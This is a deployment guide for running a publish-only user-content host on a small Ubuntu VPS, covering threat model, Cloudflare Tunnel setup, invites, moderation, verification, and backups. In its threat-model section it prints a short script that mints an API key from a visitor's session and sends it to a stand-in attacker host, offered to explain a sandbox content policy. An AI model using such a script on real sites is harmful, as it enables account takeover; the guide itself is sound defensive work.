# Deploying a publish-only space on a small VPS

For a box around **4 cores / 8 GB RAM / 75 GB SSD, Ubuntu**, open to people you
do not know — a Discord, a group of friends, a public demo.

This is a different deployment from [DEPLOY_KIMSUFI.md](DEPLOY_KIMSUFI.md).
That one runs untrusted code and spends most of its length on containment:
rootless Docker, gVisor, memory budgets, RAID. This one **does not execute
anything**, which removes all of it.

---

## 1. Why publish-only changes the whole risk picture

With a sandbox, a stranger's code runs on your machine, and every layer between
that code and your host is something you have to configure correctly and keep
patched. Get it wrong once and you lose the box.

With `SANDBOX_DRIVER=none` there is no sandbox to escape. The worst a stranger
can do is publish a file that is rude, illegal, or large. Those are moderation
and quota problems — a person can handle them, on their own schedule, without
the machine being at stake.

The guarantee does not come from an environment variable. It comes from this
machine **never installing Docker at all**. There is no socket to leak, no image
to escape, and no daemon to keep current. `install.sh` deliberately does not
install one, and you should not add one to this box.

What remains, honestly:

| Risk | What holds it |
|---|---|
| Someone publishes illegal or abusive content | You suspend the account. Nothing runs meanwhile. |
| Someone fills the disk | Per-user quota, plus a host-wide reserve that stops writes before the disk dies |
| Someone publishes a phishing page | Cloudflare flags it, you suspend the account. Same as any host. |
| Someone floods the API | `app/ratelimit.py`, plus Cloudflare in front |
| Your origin IP gets attacked | Cloudflare Tunnel — the box has no open ports at all |
| A published page acts as whoever opens it | A sandbox CSP on all user content — see below |

### The one that is not obvious

Published pages are served from the same origin as the dashboard. Without a
countermeasure that is account takeover from a single click:

```html
<!-- in any user's published page -->
<script>
fetch('/api/v1/account/keys', {method: 'POST', ...})   // mints a key
  .then(r => r.json()).then(d => fetch('https://attacker/' + d.data.api_key))
</script>
```

The browser attaches the visitor's session cookie by itself. `httponly` does not
help, because the script never touches the cookie, and `SameSite=Lax` does not
help, because it is the same site. Someone sharing a link in a chat is exactly
the product, so this is not a corner case.

Every user-served response therefore carries:

```
Content-Security-Policy: sandbox allow-scripts allow-forms allow-popups ...
```

No `allow-same-origin`, which puts published pages in an opaque origin: scripts
still run, forms still work, but requests carry no credentials.

**The cost is real and worth knowing before someone hits it.** An opaque origin
has no `localStorage`, no `sessionStorage` and no cookies, so a published app
cannot remember anything between page loads. Pages, memes, galleries, generators
and calculators are unaffected; a to-do list that saves your list is not.

The proper fix is serving user content from a **different domain** — the reason
GitHub Pages lives on `github.io`. When you have a second domain, point it at the
same app and drop the sandbox in `app/hosting.py`.

---

## 2. Try it on your laptop first

Before touching a server, run the same shape locally. Write `.env.local` (the
`.env.*` pattern is already gitignored, and this keeps your own `.env` and
database untouched):

```bash
cat > .env.local <<'EOF'
SECRET_KEY=local-testing-only-not-a-real-secret-key
PUBLIC_URL=http://127.0.0.1:8000
BASE_DOMAIN=127.0.0.1:8000
DATABASE_URL=sqlite+aiosqlite:///./data/local/agentspace.db
DATA_ROOT=./data/local/workspaces
SANDBOX_DRIVER=none
REGISTRATION_OPEN=true
INVITE_REQUIRED=false
# A laptop is usually closer to full than a server, and the production reserve
# would refuse every write here for the wrong reason.
DISK_RESERVE_MB=1
EOF
```

```bash
AGENTSPACE_ENV_FILE=.env.local python -m uvicorn app.main:app --port 8000
```

Open `http://127.0.0.1:8000/register`, make two accounts, and look at one from
the other's side. That second account matters: most of what can go wrong here
only shows up when someone who is not you opens the link.

To delete everything and start over, `rm -rf data/local` and restart.

---

## 3. Install on the server

```bash
git clone https://github.com/JCOMAIA/AgentSpace.git
cd AgentSpace
sudo bash deploy/install.sh
```

It asks one question — the public URL — and then installs Python, creates a
`agentspace` system account with no shell, sets up the virtualenv, writes an
`.env` with a fresh secret key, applies migrations, installs a hardened systemd
unit, and schedules nightly backups.

When it finishes, the space is answering on `127.0.0.1:8000` and is **not
reachable from outside**. That is deliberate — nothing is exposed until you
choose how.

Check it:

```bash
sudo -u agentspace /srv/agentspace/.venv/bin/python -m app.cli preflight
```

Every line should be `ok` or `info`. The disk line tells you how much room you
actually have.

---

## 4. Put Cloudflare in front

Use a **tunnel**, not an open port. The box makes an outbound connection and
Cloudflare routes traffic down it, so you open nothing, manage no certificates,
and never publish your origin IP. If a page of yours gets popular or attacked,
it hits Cloudflare, not your VPS.

```bash
# Install cloudflared
curl -fsSL https://pkg.cloudflare.com/cloudflare-main.gpg \
  | sudo tee /usr/share/keyrings/cloudflare-main.gpg >/dev/null
echo "deb [signed-by=/usr/share/keyrings/cloudflare-main.gpg] https://pkg.cloudflare.com/cloudflared any main" \
  | sudo tee /etc/apt/sources.list.d/cloudflared.list
sudo apt-get update && sudo apt-get install -y cloudflared
```

```bash
cloudflared tunnel login
cloudflared tunnel create agentspace
```

Write `/etc/cloudflared/config.yml`, substituting the tunnel UUID that `create`
printed and your own domain:

```yaml
tunnel: PASTE-THE-UUID-HERE
credentials-file: /root/.cloudflared/PASTE-THE-UUID-HERE.json

ingress:
  - hostname: example.com
    service: http://127.0.0.1:8000
  - service: http_status:404
```

```bash
cloudflared tunnel route dns agentspace example.com
sudo cloudflared service install
sudo systemctl enable --now cloudflared
```

Then point `PUBLIC_URL` at the real address and restart, because **every URL the
space hands an agent is built from it**. Left as anything else, an agent follows
those links somewhere that is not you:

```bash
sudo -u agentspace nano /srv/agentspace/.env    # PUBLIC_URL and BASE_DOMAIN
sudo systemctl restart agentspace
```

### Use path mode, not subdomains

`example.com/@alice/` works with no extra DNS. Subdomain mode
(`alice.example.com`) needs a proxied wildcard record, which is not available on
every Cloudflare plan, and a wildcard certificate behind it.

Path mode is also the better link to receive: the domain a person recognises
comes first, and the username right after it says a human made this. That is
most of why someone clicks.

### Do not cache published pages at the edge

It is tempting — they are static files and a popular link would cost you
nothing. Do not do it, and do not set an edge TTL on `/@*`.

Published pages are edited in place and then re-read, by their author and by
agents asked to look at them again. A cached copy means the author changes a
page, refreshes, and sees the old one; worse, an agent told "read your page and
improve it" reads the version from before the edit and works from that. It
happened during testing: a hosted chatbot reported a space as empty that had
been full for hours, because its fetcher had a stale copy from when it was.

The app sends `Cache-Control: no-cache, must-revalidate` on everything it serves
from a space. That does not mean "do not store" — a repeat visit still ends as a
304 with no body thanks to the ETag, so the bandwidth saving is mostly still
there. Only the round trip remains, which a small VPS can afford.

Keep `/api/*`, `/mcp` and `/a2a` uncached too.

---

## 5. Let people in

Registration is **invite-only** out of the box. This is the first lever you will
want, and it is one line:

```bash
# Hand out ten codes
sudo -u agentspace /srv/agentspace/.venv/bin/python -m app.cli invite --count 10
```

To open the door to anyone with the link, set `INVITE_REQUIRED=false` in `.env`
and restart. That is the right call once you want the Discord to just try it —
but do it when you are around to watch, not before a weekend.

Moderation, when you need it:

```bash
python -m app.cli user list
python -m app.cli user suspend <username> --reason "phishing page"
python -m app.cli user delete <username>
```

Suspending takes every page offline immediately and blocks the API key. Nothing
of theirs is executing, so there is no process to hunt down.

---

## 6. Verify it end to end

Do not trust that it works because it started. Walk the loop a user will walk:

```bash
# From your laptop, not the VPS
BASE=https://example.com
KEY=<a key from a registered account>

curl -s $BASE/api/v1/hello | head -30

curl -s -X PUT "$BASE/api/v1/files?path=public/index.html" \
  -H "Authorization: Bearer $KEY" -H "Content-Type: application/json" \
  -d '{"content":"<!doctype html><meta charset=\"utf-8\"><title>hi</title><h1>it works</h1>"}'

curl -s $BASE/@<username>/
```

The last command must return the page. If it does, the product works: a file
became a URL with no deploy step, which is the only thing that has to be true.

Then confirm the things that must **not** work:

```bash
# Execution is refused, and refused with an explanation
curl -s -X POST $BASE/api/v1/exec -H "Authorization: Bearer $KEY" \
  -H "Content-Type: application/json" -d '{"code":"print(1)"}'

# Secrets in public/ are never served
curl -s -X PUT "$BASE/api/v1/files?path=public/.env" \
  -H "Authorization: Bearer $KEY" -H "Content-Type: application/json" \
  -d '{"content":"SECRET=1"}'
curl -s -o /dev/null -w '%{http_code}\n' $BASE/@<username>/.env   # 404
```

---

## 7. What this box actually holds

Numbers for 4 cores / 8 GB / 75 GB:

**Memory** is not the constraint. One worker sits around 200 MB and the unit caps
it at 2 GB. Serving static files is I/O, and Cloudflare absorbs the repeats.

**Disk is the constraint.** Budget it before you invite anyone:

| | |
|---|---|
| Ubuntu and packages | ~8 GB |
| Host reserve (`DISK_RESERVE_MB`) | 5 GB |
| Nightly backups, 14 days, hard-linked | ~1× the workspace total, plus changes |
| **Left for user files** | **~30 GB** |

At the free plan's 1 GB per account that is about 30 accounts if every one fills
up, and several hundred in practice, because almost nobody does. Watch it rather
than predict it:

```bash
df -h /srv/agentspace
du -sh /srv/agentspace/data/workspaces/* | sort -h | tail -20
```

Levers when it gets tight, cheapest first: lower `disk_mb` on the free plan in
`app/config.py`; move backups off the box with `rclone`; add a volume.

**One worker, on purpose.** The rate limiter counts in memory and SQLite has one
writer. A second worker would silently double every limit and add write
contention. If you outgrow one worker, move to Postgres first, then scale.

---

## 8. Backups, and restoring one

`deploy/install.sh` schedules `agentspace-backup` nightly at 04:12. It snapshots
the database with `sqlite3 .backup` — a plain `cp` of a live SQLite file
restores fine right up until the night you need it — and hard-links the
workspaces against yesterday, so two weeks of daily snapshots cost about one
copy plus what changed.

Restoring:

```bash
sudo systemctl stop agentspace
sudo -u agentspace gunzip -c /var/backups/agentspace/db-YYYYMMDD-HHMM.sqlite.gz \
  > /srv/agentspace/data/agentspace.db
sudo -u agentspace rsync -a --delete \
  /var/backups/agentspace/workspaces-YYYYMMDD-HHMM/ \
  /srv/agentspace/data/workspaces/
sudo systemctl start agentspace
```

A backup that lives only on the machine it backs up is a copy, not a backup.
Point `rclone` at somewhere else as soon as there is anything you would miss.

---

## 9. Day to day

```bash
journalctl -u agentspace -f              # what the space is doing
journalctl -u agentspace -p err -n 50    # only what went wrong
systemctl status agentspace cloudflared
df -h /srv/agentspace
```

Two things are worth actually watching:

- **`host disk near capacity` in the log.** Writes are already being refused for
  everyone when this appears. It is the only failure here that takes the whole
  space down at once.
- **`cloudflared` down.** The box has no open ports, so if the tunnel dies the
  space is invisible even though it is running perfectly. `Restart=always` covers
  a crash; it does not cover an expired credential.

Upgrading:

```bash
cd /srv/agentspace && sudo bash deploy/install.sh
```

Same script, idempotent: pulls, reinstalls dependencies, migrates, restarts.
